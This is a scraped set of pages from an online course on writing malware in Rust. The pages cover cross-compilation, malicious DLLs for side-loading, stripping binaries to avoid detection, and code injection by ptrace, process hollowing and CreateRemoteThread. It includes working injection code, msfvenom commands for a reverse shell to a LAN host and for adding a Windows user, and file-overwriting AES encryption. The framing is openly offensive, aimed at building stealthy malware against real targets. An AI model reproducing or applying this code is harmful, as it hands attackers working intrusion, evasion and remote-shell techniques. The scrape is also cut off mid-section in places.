local machine, compilation produces an executable specific to the platform on which we are working. However, in many scenarios, it is necessary to deploy the application on embedded systems, remote servers or devices with different architectures or operating systems. This is where cross-compilation comes in.\nCross-compilation is a technique that allows code to be compiled for a different system, providing the flexibility for developers to create applications for a variety of hardware architectures without the need for a dedicated development environment for each target.\nBy using cross-compilation in Rust, we as malware developers can compile our source code on a development machine, which is generally more powerful, and then generate an executable that is compatible with all our targets, including Linux and Windows for the purposes of this course. This greatly increases our attack surface. \nIn this part of the course on cross-compilation in Rust, we will explore the basic concepts, the tools available and the best practices for taking full advantage of this approach in the development of cross-platform malware. \nTo do this, we'll start with this simple :\n.\n├── Cargo.lock\n├── Cargo.toml\n├── src/\n    ├── main.rs\n\nSource : \nfn main() {\n    println!(\"Hello, world!\");\n}\n\nSelect toolchain🔗\nAs indicated in the Cargo optimisation course, the toolchain is the chain of tools used to compile our program in Rust. \nRustup, the toolchain management tool, allows us to install toolchains for other platforms, such as Windows:\n$ rustup toolchain install stable-x86_64-pc-windows-gnu\n\nHowever, this requires you to install the ‘MinGW’ compiler for Windows beforehand, which can be a little complicated on Linux depending on your distribution.\nThen compile our program by telling Cargo to use this toolchain in the :\n$ cargo build --target x86_64-pc-windows-gnu\n\nAnd that's it, we've successfully compiled our program for Windows, and the executable can be found here:\ntarget/x86_64-pc-windows-gnu/debug/hello_cross.exe\n\nTo test it, we can, for example, run it with the Wine emulator.\nUsage of \"cross\"🔗\nTo avoid having to install Windows compilation dependencies on our machine, there is a ‘cross’ tool to simplify the cross-platform compilation phase. It relies on a system of Docker or Podman containers to embed all the necessary dependencies for each toolchain.\nTo install it, you can use the Cargo manager or your distribution's packager, if available:\n$ cargo install cross\n\nThen simply re-execute the command to compile our program, replacing ‘cargo’ with ‘cross’ :\n\nIt will download the image linked to the specified platform, then compile your program. If you need to test your program with ‘cross run’, it will run it directly with Wine within the container. \nOptimise code for cross-compilation🔗\nIt goes without saying that the precompiler knows which platform it is compiling for, which is why we are going to make use of the ‘cfg!’ macro to optimise our code for cross-compilation. \nWe're going to modify the source code of our project to display a string of characters depending on the platform on which it's being run:\nfn main() {\n    let plateform = \"Linux\";\n    if plateform == \"Linux\" {\n        println!(\"Hello Linux !\");\n    } else if plateform == \"Windows\" {\n        println!(\"Hello Windows !\");\n    } else {\n        println!(\"Unsupported plateform\");\n    }\n}\n\nYou can see straight away that in this version, we are obliged to change the contents of the ‘platform’ variable if we want to compile the program for Windows. Here is the corrected version using the ‘cfg!’ macro :\nfn main() {\n    if cfg!(target_os = \"linux\") {\n        println!(\"Hello Linux !\");\n    } else if cfg!(target_os = \"windows\") {\n        println!(\"Hello Windows !\");\n    } else {\n        println!(\"Unsupported plateform\");\n    }\n}\n\nAnd that's it, our code is now cross-platform. But it can also be optimised more efficiently by using the global macro ‘#[cfg()]’ with this example: \n#[cfg(target_os = \"linux\")]\nstatic HELLO: &amp;str = \"Hello Linux !\";\n#[cfg(target_os = \"windows\")]\nstatic HELLO: &amp;str = \"Hello Windows !\";\n\nfn main() {\n    println!(\"{}\", HELLO);\n}\n\nNow we're going to demonstrate the use of the global macro ‘#[cfg()]’ on a slightly more complex structure to simulate the architecture of a real project:\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n    ├── main.rs\n    ├── linux\n        ├── lib.rs\n        └── mod.rs\n    └── windows\n        ├── lib.rs\n        └── mod.rs\n\n// src/linux/lib.rs\n\npub fn print_hello() {\n    println!(\"Hello Linux !\");\n}\n\n// src/windows/lib.rs\n\npub fn print_hello() {\n    println!(\"Hello Windows !\");\n}\n\n// src/linux/mod.rs AND src/windows/mod.rs\n\nmod lib;\npub use lib::print_hello;\n\n// src/main.rs\n\n#[cfg(target_os = \"linux\")]\nmod linux;\n#[cfg(target_os = \"windows\")]\nmod windows;\n\n#[cfg(target_os = \"linux\")]\nuse crate::linux::print_hello;\n#[cfg(target_os = \"windows\")]\nuse crate::windows::print_hello;\n\nfn main() {\n    print_hello();\n}\n\nWith this structure, we can correctly separate our cross-platform code, with the ‘print_hello’ function common to each platform.\nWe invite you to read the official reference on conditional compilation in Rust for a full list of possibilities:\nhttps://doc.rust-lang.org/reference/conditional-compilation.html\nOptimise dependencies🔗\nIf we use the same project to produce our malware on Linux and Windows, it is normal for certain dependencies to apply only to the platform in question. \nTo separate the dependencies between platforms correctly, Cargo provides us with the ‘cfg’ macro in the configuration of the ‘Cargo.toml’ file:\n// Cargo.toml\n\n[package]\nname = \"hello_cross\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies] # Dépendances communes\nanyhow = \"1.0.75\"\n\n[target.'cfg(windows)'.dependencies]\nwindows = \"0.52.0\"\n\n[target.'cfg(linux)'.dependencies]\nlibc = \"0.2.150\"\n\nIn this example, ‘anyhow’ is compiled for all platforms, ‘windows’ for the ‘Windows’ platform and ‘libc’ for the Linux platform.\nConclusion🔗\nYou now have everything you need to start developing malware that will run on more platforms.\n","id":" https://nu11busters.github.io/rust-maldev-course/cargo/cross-compilation/","title":"Cross-compilation"}," https://nu11busters.github.io/rust-maldev-course/cargo/dynamic-library/":{"body":"Dynamic libraries, also known as ‘Shared Objects’ on Linux or ‘DLLs’ (Dynamic Link Libraries) on Windows, provide a powerful mechanism for the organisation, reuse and interoperability of software development.\nUnlike static libraries, which are linked at compile time, dynamic libraries are loaded at run time.\nIn the context of offensive security, dynamic libraries are often abused to exploit a system.\nIn this part of the course, we will learn how to compile dynamic libraries in Rust, focusing on the production of malicious libraries to usurp legitimate libraries, for example.\nThis involves understanding how to expose Rust functions so that they can be used by other languages, which is known as interoperability.\nWe'll start with the following project, which exposes a simple function that displays a string of characters:\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n    └── lib.rs\n\nSource :\npub fn hello_library() {\n    println!(\"Hello library !\");\n}\n\nWhen compiled, the result is as follows:\n\nWe can see that the compiler simply generates a sort of archive, which is normally used afterwards to link it statically to the program that uses the library in question.\nThis is not a dynamic library, so we need to add the following section to our ‘Cargo.toml’ file to tell Cargo to generate a dynamic library:\n# Cargo.toml\n\n...\n[lib]\ncrate-type = [\"dylib\"]\n...\n\nThen when you recompile, you get a dynamic :\n\nNow, there's one more major concern, and that's the ABI.\nThe ABI is a set of rules and conventions that dictate how functions, data structures and system calls should be defined in binary format in machine code. A bit like an API, but for binaries.\nThe problem is that the ABI of the C language, the most commonly used, and that of the Rust language, are not the same. Reluctantly, we're going to have to adapt our project so that it uses the ABI of the most common language to increase our attack surface.\nFirstly, we need to tell Cargo to use the C :\n# Cargo.toml\n\n...\n[lib]\ncrate-type = [\"cdylib\"]    # instead of \"dylib\"\n...\n\nThen he also has to make changes to the source code:\n// src/lib.rs\n\n#[no_mangle]\npub extern \"C\" fn hello_library() {\n    println!(\"Hello dyn library !\");\n}\n\nThe addition of the ‘#[no_mangle]’ is necessary to prevent the compiler from modifying the final name of the function.\nIn our example, there aren't many difficulties as there are no input arguments or return values, but if there were, we couldn't simply return Rust types, but C types. \nFortunately for us, they are available in the standard library in the ‘std::os::*’ path.\nNow we finally have a dynamic library that can be called by C programs. Note that the steps we've just produced also work on Windows.\nWe're now going to develop another binary to test our dynamic library, and at the same time show how to run dynamic libraries compiled with the C ABI, in our Rust program.\nHere is the source code:\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n    └── main.rs\n\n// src/main.rs\n\nuse libloading::{Library, Symbol};\n\nfn main() {\n    println!(\"Hello binary !\");\n    unsafe {\n        let lib = Library::new(\"hello_lib.dll\").expect(\"error loading lib\");\n        let func = lib\n            .get::&lt;Symbol&lt;extern \"C\" fn()&gt;&gt;(b\"hello_library\")\n            .unwrap();\n        func();\n    }\n}\n\nHere, we use the ‘libloading’ dependency, which loads our dynamic library from our current directory, then we import the function using its name ‘hello_library’ and finally we execute it.\nWe successfully observe the result at runtime:\n\nThis example works equally well on a Linux system.\nConclusion🔗\nWe now have all the tools we need to develop malware in the form of a dynamic library, which could be useful when we want to exploit attacks such as ‘Side-Loading DLL’ or ‘Phantom DLL’ or simply code injection in general.\n","id":" https://nu11busters.github.io/rust-maldev-course/cargo/dynamic-library/","title":"Dynamic library"}," https://nu11busters.github.io/rust-maldev-course/cargo/optimise/":{"body":"In this first part of the course, we will explain the techniques for maximising the efficiency of Cargo for malware design.\nOptimising Cargo involves configuring it to reduce the size of the final binary, as well as ensuring that the code generated contains no compromising indicators, thus guaranteeing that any signatures recognisable by security solutions are hidden. \nThis course will immerse you in Cargo's features, exploiting its compilation, dependency and configuration management capabilities to bypass traditional defences and avoid detection.\nTo do this, we will start with this simple project (download the code in the appendix):\n.\n├── Cargo.toml\n├── Cargo.lock\n└── src\n    └── main.rs\n\n# src/main.rs\n\nfn main() {\n\tprintln!(\"Hello, world!\");\n}\n\nWe'll compile it with the default configuration and analyse the result:\n\nWhat ?? Our little \"hello world\" program produce a 4.2 Mo size binary ??\n\nUsing the strings utility, which will extract all the strings in plain text in a binary, we can also find compromising indicators such as our user name user0 and the name of the binary at compilation time.\nAnd if we start playing around with a debugger such as the gdb utility, we can even go back to the original source code :\n\nThe list command in gdb is used to rebuild the source code from the debugging symbols.\nOptimising Cargo for malware development🔗\nBy default, Rust optimises execution speed, compilation speed and ease of debugging rather than binary size, because for the vast majority of applications this is ideal.\nBut in the context of malware development, a malicious actor is desperate to reduce the size of its binaries for the following reasons:\n\nA heavier executable is obviously more suspect for security solutions, especially if it tries to imitate other legitimate programs that are lighter. We can think of the metaphor of a pipe through which we can pass our code with complete discretion.\nReducing the amount of debugging information in the binary makes malware analysis and detection more complex for security researchers.\n\nAnd Cargo provides us with several mechanisms to achieve this.\n1. Use the \"release\" compilation profile🔗\nProfiles allow you to change compiler settings and influence things like optimisations and debugging symbols.\nCargo has four built-in profiles: dev used by default, release, test and bench. The profile is automatically chosen according to the command being executed if no profile is specified on the command line. In addition to the built-in profiles, user-defined custom profiles can also be specified.\nThe release profile is used for optimised artefacts used for production, and removes some of the debugging symbols.\nTo apply this profile, simply compile with the --release option or just -r :\n\nWell, now our binary is optimised and there's no trace of my user name. We've also removed the possibility of reconstructing the source code just as easily :\n\nHowever, the size of the binary is still abnormally large and there are still traces, such as the name of the program at compile time :\n\n2. Optimising the \"release\" compilation profile🔗\nProfile parameters can be modified in Cargo.toml using the [profile] table. In each profile, individual parameters can be modified with key/value pairs such as these:\n# Cargo.toml\n\n# Configuration par défaut du profile \"dev\", utlisé avec `cargo build`\n[profile.dev]\nopt-level = 0\ndebug = true\n...\n\n# Configuration par défaut du profile \"release\", utlisé avec `cargo build --release`\n[profile.release]\nopt-level = 3\ndebug = false\n...\n\nopt-level :🔗\nThe \"opt-level\" key controls the level of optimisation. Higher levels of optimisation can result in faster code execution at the expense of longer compilation times. Higher levels can also modify and reorganise compiled code, which can make it more difficult to use with a debugger.\nPossible values are :\n\n0: no optimisation (used by the \"dev\" profile)\n1: basic optimisation\n2: some optimisations\n3: all optimisations (used by default by the \"release\" profile)\ns: optimised for binary size\nz: optimised for bit size and loop vectorisation disabled.\n\nFor our malware, we'll choose the value s to take advantage of the binary size optimisation without changing the default behaviour too much. You are invited to test different values depending on the libraries used, which may have an impact.\nstrip :🔗\nThe strip key controls the presence or absence of debugging symbols. Given that these are not necessary data for program execution and that the last thing we want is for someone to debug our malware, we're going to have the pleasure of removing them.\nCargo allows us to do this by setting the strip key to the value true.\nThis action can also be performed on Linux with the strip utility.\nLTO :🔗\n\"Link Time Optimization\" is a feature of LLVM, Rust's intermediate compiler, designed to optimise the work of the linker. Its aim is to rationalise the linking process by enabling in-depth optimisation, in particular by eliminating unused portions of code. As a result, the aim is to reduce the size of the final binary.\nCargo allows us to use this option by setting the lto key to true.\npanic :🔗\nThe panic key is used to control the behaviour of our program when it \"panics\" (can be called with the 'panic!' macro). In Rust, a panic occurs when the program encounters an error that is deemed irrecoverable.\nThe possible values are :\n\nunwind: default value, which instructs the program to unwind the stack to produce a useful trace for debugging. In our situation, we absolutely don't want our malware to leave any more information and this takes up space in our binary.\nabort: the program will terminate immediately. So it's more advantageous for us.\n\nCargo lets us control this option by setting the \"panic\" key to the \"abort\" value.\n\nLet's analyse the results of the many optimisations we have made to our Cargo.toml file:\n# Cargo.toml\n\n[package]\nname = \"hello_esgi\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\n\n[profile.release]\nopt-level = \"s\"\nstrip = true\nlto = true\npanic = \"abort\"\n\n\nAs you can see from the screenshot above, the compilation did take a little longer, but the size of our binary was reduced from 4.2 Mo to just 284 Ko.\n\nNow we're going to add another test for our optimisation, we're going to modify the source code to force our program to panic:\n# src/main.rs\n\nfn main() {\n  println!(\"Hello, world!\");\n  panic!();\n}\n\nThen we'll run it again, this time without the optimisations:\n\nThen with our optimisations :\n\nThe benefits are clear to see, given that it no longer leaks sensitive information in relation to our malware's source code.\nHowever, there's one more annoying detail in this screenshot.\nThe program shows the code file where it panicked (\"src/main.rs\") as well as the position (line 3, column 5). At first glance, this may not seem very important, but in reality it could provide a serious clue to an analyst examining our malware, for example if our program panics in an external library.\n3. Using \"unstable\" compiler features🔗\nTo solve this problem, we need to explore more advanced settings that require the use of Rust compiler options that have been implemented but are not yet considered stable.\nWe will need to use the nightly toolchain, which is the compilation tool suite updated daily with the latest Rust :\nrustup install nightly\n\nThis command will install the necessary toolchain.\nWe will then specify that our project uses this toolchain using the \"rust-toolchain.toml\" file that we will add:\n.\n├── Cargo.lock\n├── Cargo.toml\n├── rust-toolchain.toml # New file\n├── src/\n    ├── main.rs\n\nWith the following content:\n# rust-toolchain.toml\n\n[toolchain]\nchannel = \"nightly\"\n\nWe can now use \"unstable\" compiler features.\nlocation-detail :🔗\nThe unstable location-detail option, which is passed directly to the rustc compiler, is used to control the amount of factual detail, such as file, row and column, emitted when using the caller_location() function called when a Rust program panics.\nIn our situation, we absolutely do not want to deliberately divulge this type of information. So we're going to pass the compiler the location-detail=none argument. Normally passed to the like this :\nrustc -Zlocation-detail=none main.rs\n\nTo pass options to the compiler, we need to add a configuration to Cargo in a config.toml file, not to be confused with the Cargo.toml file which is used to specify dependencies, project details and project parameters, whereas config.toml is a configuration file which uses more advanced features and can be configured per project or globally.\n.\n├── .cargo/          # New file\n    ├── config.toml  # New file\n├── Cargo.lock\n├── Cargo.toml\n├── rust-toolchain.toml\n├── src/\n    ├── main.rs\n\nAnd finally added the contents of the :\n# .cargo/config.toml\n\n[build]\nrustflags = [\"-Zlocation-detail=none\"]\n\nNow all we have to do is recompile :\n\nThe compromising information has now been removed.\nbuild-std :🔗\nRust provides a precompiled version of the standard library (std) with its toolchain. This means we don't need to recompile std every time we compile our malware. And remember that the standard library is statically linked to our binary, of course.\nAlthough this is very practical, for us malware developers there are several disadvantages:\n\nThe precompiled standard library is optimised for speed, but not for size.\nIt is not possible to remove the parts of the standard library that are not used in our malware (with LTO) and is not compiled with our previous optimisations.\n\nThis is where build-std comes in. The build-std functionality is capable of compiling the standard library with our malware from source. It does this using the rust-src component provided by rustup:\nrustup component add rust-src --toolchain nightly\n\nYou can now control how the standard library is compiled by adding the following configuration:\n# .cargo/config.toml\n\n[unstable]\nbuild-std = [\"std\", \"panic_abort\"] # Add build-std\n\n[build]\nrustflags = [\"-Zlocation-detail=none\"]\n#target = \"x86_64-pc-windows-gnu\"       # For Windows\ntarget = \"x86_64-unknown-linux-gnu\"     # For Linux\n\nWhen using build-std it is also necessary to specify our compilation target.\nWe can now see a further reduction in the size of our binary :\n\npanic_immediate_abort :🔗\nEven though panic = \"abort\" specified in Cargo.toml is supposed to disable the code executed when a program panics, the Rust compiler will still include the panic strings and formatting code in the final binary by default. An unstable panic_immediate_abort feature has been built into the nightly compiler to solve this problem.\nTo use it, repeat the instructions above to use build-std, and also add the following configuration:\n# .cargo/config.toml\n\n[unstable]\nbuild-std = [\"std\", \"panic_abort\"]\nbuild-std-features= [\"panic_immediate_abort\"] # Add new feature\n\n[build]\nrustflags = [\"-Zlocation-detail=none\"]\n#target = \"x86_64-pc-windows-gnu\"\ntarget = \"x86_64-unknown-linux-gnu\"\n\nThen look at the result:\n\nThe reduction is quite impressive, from 212 Ko to 28 Ko. At runtime, we can also see that it no longer displays anything when it panics, which is to our advantage in terms of malware development.\nConclusion🔗\nWe have now reached the last level of optimisation that we can use without having too much impact on the operation of our malware. There are still many other ways of reducing the size of our binary aggressively, but they have too great an impact on the way we program. \nFor example, we can completely separate ourselves from the standard Rust library (with the #[no_std] macro) and use only functions from the libc directly, which allows us to obtain binary sizes relatively close to those programmed in C. \nThe disadvantage is that we lose the use of all the external libraries that depend on the standard library, but there are plenty of others that don't, like most cryptographic libraries.\nNow that you have all the information you need to optimise Cargo for malware development, I would advise you not to apply all these optimisations at the start of your development phase. In fact, it is possible that some of the features you use may have an impact on the operation of the external libraries you use. \nThat's why we recommend that you only apply these options at the end of your development phase, and then deactivate those that could cause problems as you go along.\nThe final source code is provided as an appendix to this course.\n","id":" https://nu11busters.github.io/rust-maldev-course/cargo/optimise/","title":"Optimise Cargo"}," https://nu11busters.github.io/rust-maldev-course/code_injection/":{"body":"","id":" https://nu11busters.github.io/rust-maldev-course/code_injection/","title":"Code injection"}," https://nu11busters.github.io/rust-maldev-course/code_injection/injection-with-ptrace/":{"body":"In this section, we'll look at how the ptrace system call on Linux can be used to inject code into a running process to make it execute the code you want.\nThe ptrace system call allows you to attach yourself to a process and control its execution, modify its memory space and consult its registers. It is used by debuggers such as GDB. Attaching to a process with this system call is called tracing.\nHere, we're going to modify the RIP register and replace the process instructions with our own.\nThe target process is the following program, i.e. it is possible to attack any process as long as permissions allow.\nThis is our target program, my_process.c:\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n\twhile(1) {\n\t\tputs(\"Hi !\");\n\t\tsleep(1);\n\t}\n}\n\n&gt;&gt;&gt;

In our example, we create a local user on the targeted machine (Windows) and launch a reverse shell in the case of our Linux program. The code will be generated by msfvenom msfvenom -p windows/x64/exec CMD=\"net user /add kev_user\" -f rust and msfvenom -p linux/x64/shell_reverse_tcp -f rust LHOST=192.168.1.10 LPORT=4444. To help you understand, here is a diagram:\n\nWindows Program🔗\nTo develop this program, we once again rely on the Windows API with the associated documentation we have already covered in previous sections. After creating a new project with cargo new, you can populate your Cargo.toml with these dependencies:\n\nanyhow = 1.0.79\ncolored = 2.1.0\nwindows = {version = \"0.52.0\", features = [\"Wdk_System_Threading\", \"Win32_Foundation\", \"Win32_Security\", \"Win32_System_Diagnostics_Debug\", \"Win32_System_Kernel\", \"Win32_System_Threading\"]}\n\nIn your main.rs, you can declare the crates as follows:\nuse anyhow::{anyhow, Ok, Result};\nuse colored::*;\nuse core::ffi::c_void;\nuse std::ptr;\nuse std::{thread, time};\nuse windows::core::{PCSTR, PSTR};\nuse windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};\nuse windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};\nuse windows::Win32::System::Threading::{\n    CreateProcessA, ResumeThread, CREATE_SUSPENDED, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,\n    STARTUPINFOA,\n};\n\nSummary of Actions Performed by Our Program:\n\nCreate a process with CreateProcessA, which can be a cmd, notepad, or anything else. Its state will be set to \"suspended\" while we make our modifications.\nCreate a handle on this process and retrieve information, with NtQueryInformationProcess, such as the base address of the Process Environment Block (PEB). This element contains information like data structures, process startup parameters, and the base address of the program image.\nRead the process memory with ReadProcessMemory, verify the conformity of our executable via its magic bytes (MZ in our case), and retrieve data such as header addresses and the entry point (actual starting address of program execution).\nModify the data in the process memory via WriteProcessMemory with our shellcode.\nContinue program execution after modification via ResumeThread.\n\nWithin the code, we also add the shellcode, check for errors at each key point using the anyhow crate, include sleeps to allow time to see the execution of each part one after another, and return an Ok(()) to indicate that the program executed successfully. Prints of each execution part have been added for the lesson, but they can obviously be removed.\nCode Details🔗\nOur shellcode will be contained in the variable 'shellcode' as a byte array. A variable to hold program information will be declared as type PROCESS_INFORMATION. Finally, the created suspended process will be indicated as a pointer. An \"unsafe\" block will be necessary to use most Windows API functions, including our CreateProcessA:\nlet mut process_info = PROCESS_INFORMATION::default();\nlet program_called = PSTR::from_raw(\"C:\\\\Windows\\\\System32\\\\cmd.exe\".to_string().as_mut_ptr());\n\nif unsafe {\n    CreateProcessA(\n        PCSTR::null(),\n        program_called,\n        None,\n        None,\n        false,\n        CREATE_SUSPENDED,\n        None,\n        PCSTR::null(),\n        &amp;STARTUPINFOA::default(),\n        &amp;mut process_info,\n    )\n}\n\nWe then define a handle on our process, a structure to store its information PROCESS_BASIC_INFORMATION, and query the process:\nlet process_handle = process_info.hProcess; \nlet mut basic_info = PROCESS_BASIC_INFORMATION::default();\n\nif unsafe {\n    NtQueryInformationProcess(\n        process_handle,\n        PROCESSINFOCLASS::default(),\n        &amp;mut basic_info as *mut _ as *mut c_void,\n        8 * 6,\n        &amp;mut 0_u32,\n    )\n}\n\nWe retrieve the image address (the program's entry point), create a buffer to store it, and call ReadProcessMemory:\nlet image_base_address = basic_info.PebBaseAddress as u64 + 0x10; \nlet mut address_buffer = [0u8; 1];\n\nif unsafe {\n    ReadProcessMemory(\n        process_handle,\n        image_base_address as *const c_void,\n        address_buffer.as_mut_ptr() as *mut c_void,\n        8,\n        None,\n    )\n}\n\nA second ReadProcessMemory is called to retrieve the DOS headers to verify our program's integrity:\nlet mut header_buffer = [0_u8; 0x200];\nlet header_pointer = header_buffer.as_mut_ptr() as usize;\nlet pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };\n\nif unsafe {\n    ReadProcessMemory(\n        process_handle,\n        pe_base_address as *const c_void,\n        header_buffer.as_mut_ptr() as *mut c_void,\n        0x200,\n        None,\n    )\n}\n\nThe final step follows, we retrieve the program header address and its entry point, then write our shellcode into memory with WriteProcessMemory and resume execution:\nlet e_lfanew = unsafe { ptr::read((header_pointer + 0x3C) as *const u32) };\n\nlet opthdr_offset = e_lfanew as usize + 0x28; \nlet entry_point = unsafe { ptr::read((header_pointer + opthdr_offset) as *const u32) };\nlet entry_point_address = entry_point as usize + pe_base_address;\n\nif unsafe {\n    WriteProcessMemory(\n        process_handle,\n        entry_point_address as *const c_void,\n        shellcode.as_ptr() as *const c_void,\n        shellcode.len(),\n        None,\n    )\n}\nlet resume = unsafe { ResumeThread(process_info.hThread) };\n\nif resume != 1 {\n    return Err(anyhow!(\n        \"{}\",\n        \"[-] Could not resume the suspended cmd.exe's execution\".red()\n    ));\n}\nOk(())\n\nOnce the code is compiled with cross, we can execute it, as shown in the following image, where the user kev_user has been successfully added to the local users of the machine:\n\nYou can find the full code in the next section.\nLinux Program🔗\nRegarding the Linux program, it is much simpler. The following crates should be imported into your Cargo.toml:\n\ncolored = 2.1.0\nnix = { version = \"0.27.1\", features = [\"ptrace\"] }\n\nIn the main.rs, you can declare the following dependencies:\nuse colored::*;\nuse nix::sys::ptrace::{detach, getregs, traceme, write};\nuse nix::sys::wait::waitpid;\nuse nix::unistd::{execv, fork, ForkResult};\nuse std::ffi::{c_void, CStr, CString};\nuse std::{thread, time};\n\nFirst, we declare our shellcode with the variable let shellcode: [u8; X] where X represents the number of bytes in the shellcode. We used the following command to generate our shellcode: msfvenom -p linux/x64/shell_reverse_tcp -f rust LHOST=192.168.1.10 LPORT=4444, which is a simple reverse TCP shell. \nOur program will consist of a large block of code composed of a match unsafe { fork() }. This function is responsible for creating a child process by duplicating the parent process. We then use this process creation via a ForkResult which will contain information about the child and parent processes if the fork() was successful.\nThe child process must be set as \"traceable\" to make the necessary modifications for shellcode injection. An executable is then defined (/usr/bin/bash in our case) and will replace our current process via an execve(). We then focus on the parent process, pausing the child process via waitpid() and retrieving its RIP register. This is where the shellcode will be injected. We then resume the execution of the child process via detach(). Sleeps have been integrated to allow easier observation of the attack progression. After execution, we successfully get a shell on the remote machine:\n\nThe corresponding code is available in the next section.\n","id":" https://nu11busters.github.io/rust-maldev-course/code_injection/process-hollowing/","title":"Process Hollowing"}," https://nu11busters.github.io/rust-maldev-course/code_injection/remote-threads/":{"body":"This section is dedicated to the implementation of shellcode injection within a program where we will allocate the necessary memory space to contain this shellcode. We will use the windows crate along with the official Microsoft documentation to get the information we need to use their functions. The flow of operations can be represented as follows:\n\nAfter creating a new project via cargo new, add these dependencies to your Cargo.toml:\n\nanyhow = 1.0.77\nwindows = { version = \"0.52.0\", features = [\"Win32_Foundation\", \"Win32_System_Threading\", \"Win32_System\", \"Win32_System_Kernel\", \"Win32_System_Memory\", \"Win32_System_Diagnostics_Debug\", \"Win32_Security\"] }\n\nIn our main.rs, we define our imports:\nuse anyhow::{anyhow, Ok, Result};\nuse std::process::Command;\nuse windows::Win32::Foundation::CloseHandle;\nuse windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;\nuse windows::Win32::System::Memory::VirtualAllocEx;\nuse windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;\nuse windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE};\nuse windows::Win32::System::Threading::CreateRemoteThread;\nuse windows::Win32::System::Threading::OpenProcess;\nuse windows::Win32::System::Threading::PROCESS_ALL_ACCESS;\n\nThe first step is generating our shellcode. In our case, we use msfvenom to add a user to the target machine:\nmsfvenom -p windows/x64/exec CMD=\"net user /add kev_user\" -f rust\n\nThe output of this command will be stored in the shellcode variable. We then define the program we want to launch, in our case, notepad.exe, and retrieve its PID.\n\nA handle is created via OpenProcess and will be used for our future actions on notepad.exe. The documentation for OpenProcess is available for the crate and the Windows API. Here is its definition:\n\nWe pass parameters such as the desired access to the process, its handle, and the PID. Once this handle is retrieved, we will allocate memory within it via VirtualAllocEx:\n\n\nIn this function, we pass the process handle, None to let the function allocate the memory address itself, dwSize references the size of our shellcode, the allocation type is set to MEM_COMMIT | MEM_RESERVE, and we request the ability to read, write, and execute on this address range. Everything will be assigned to the allocated_memory variable. After checking that our program is running smoothly, we use WriteProcessMemory:\n\n\nWriteProcessMemory takes parameters such as the handle, base address (our allocated_memory), a buffer in the form *const std::ffi::c_void, the size of our shellcode, and an optional parameter which we set to None. These data will be stored in the write variable. The last thing to do is create a remote thread pointing to the notepad.exe process. We use CreateRemoteThread:\n\n\nThe handle used is the same as before, we set the security attributes to None to use the default ones, the stack size is set to 0 to use the default size, after transforming our variable containing allocated_memory into a function pointer we pass it as a parameter to StartAddress, Parameter is set to None because we do not pass any parameters, 0 indicates the thread to execute immediately after its launch, and finally None indicates that we do not want a thread identifier.\nAfter compiling via:\ncross b -r --target x86_64-pc-windows-gnu\n\nAnd launching it on a Windows 10 machine, we can see the program executing successfully:\n\nYou can find the full code in the next section.\n","id":" https://nu11busters.github.io/rust-maldev-course/code_injection/remote-threads/","title":"CreateRemoteThread"}," https://nu11busters.github.io/rust-maldev-course/conclusion/":{"body":"Information Technology Watch🔗\nInformation technology watch involves monitoring, collecting, and analyzing information and updates in the field of IT, including technologies, software, hardware, trends, best practices, and developments.

Once again, we are using implementations provided by RustCrypto, but we want to point out that another crate has caught our attention for AES: libaes. This implementation is noteworthy because it operates without any dependencies, and its creators claim it is three times faster than the RustCrypto implementation. However, this crate has not been subjected to code control tests implemented by external companies.\nThe AES mode we will use is GCM (Galois/Counter Mode). This mode is used for its performance and works on block cipher algorithms like AES. This mode allows us to guarantee both the integrity and confidentiality of the data we will process. It is part of the encryption class known as AEAD: Authenticated Encryption with Associated Data.\nIn this section, we will implement AES on a string to encrypt it with a cipher and a nonce, then we will address a file.\nImplementation of AES on a String🔗\nAs usual since the beginning of this chapter, we refer to the documentation to find information about the methods and Traits we will use: documentation-AES. You can now create a new project and add the following crate to your Cargo.toml:\n\naes-gcm = 0.10.3\n\nThe Traits used in this example will be:\n\ngenerate_key() which will take as a parameter a random number generated by OsRng provided by the rand crate\nnew() which will take as a parameter the key previously generated and return a cipher\ngenerate_nonce() which will also take as a parameter a random number\nencrypt() which will group all our previous data as parameters and return a vector of u8 data\n\nThe related code is as follows:\nuse aes_gcm::{\n    aead::{Aead, AeadCore, KeyInit, OsRng},\n    Aes256Gcm \n};\n\nfn main() {\n    let message_plain = b\"hello world\";\n\n    let aes_key = Aes256Gcm::generate_key(OsRng); // We generate our key with a random value from OsRng\n    let cipher = Aes256Gcm::new(&amp;aes_key); // We create the cipher from the generated key\n    let nonce = Aes256Gcm::generate_nonce(&amp;mut OsRng); // We create the nonce associated with our random value\n    println!(\"The aes key is: {:?}\\nThe nonce is: {:?}\", &amp;aes_key, &amp;nonce);\n\n    let ciphertext = cipher.encrypt(&amp;nonce, message_plain.as_ref()).expect(\"Can't encrypt the message!\");\n    let plaintext = cipher.decrypt(&amp;nonce, ciphertext.as_ref()).expect(\"Can't decrypt the message\");\n\n    let utf_plaintext = String::from_utf8(plaintext).unwrap();    \n    println!(\"The encrypted message is: {:?} \\nand the decrypted is: {:?}\", ciphertext, utf_plaintext);\n}\n\nThe result after a cargo run is as follows:\n\nImplementation of AES on a File🔗\nIn this section, we will focus on the implementation of AES to encrypt the content of a file. The steps will be similar to those presented previously with the handling of file opening in sha2 and the creation of the AES symmetric key. One of the differences will be how we open the file to get a file descriptor. This time, we will use the OpenOptions structure to define the read and write modes. This will give you another example of handling files with Rust. We will use simple expressions and delete the original file to recreate it with the encrypted content. The content of this source code will be available in the next section of the chapter.\nuse aes_gcm::{\n    aead::{Aead, AeadCore, KeyInit, OsRng},\n    Aes256Gcm \n};\nuse std::{fs, io::{Read, Write}};\n\nfn main() {\n    let path = \"hello.txt\"; // Path of our file\n    let mut file = fs::OpenOptions::new().read(true).write(true).open(&amp;path).expect(\"Can't open the file\"); // File handle\n    let mut file_content = String::new(); // Buffer for our file content\n    file.read_to_string(&amp;mut file_content).expect(\"Can't read the file\"); // Put file content in buffer\n    